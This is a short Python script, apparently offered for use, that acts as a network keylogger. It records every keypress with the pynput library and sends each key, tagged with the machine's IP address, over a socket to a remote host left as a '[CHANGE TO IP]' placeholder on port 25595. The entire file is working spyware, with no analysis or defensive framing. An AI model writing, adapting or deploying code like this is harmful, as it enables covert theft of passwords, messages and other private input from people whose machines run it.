import pynput
from pynput.keyboard import Key, Listener
import socket

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

s = socket.socket()
s.connect(("[CHANGE TO IP]", 25595))

def on_press(key):
    s.send(f"{ip} {key}".encode())


with Listener(on_press=on_press) as Listener:
    Listener.join()
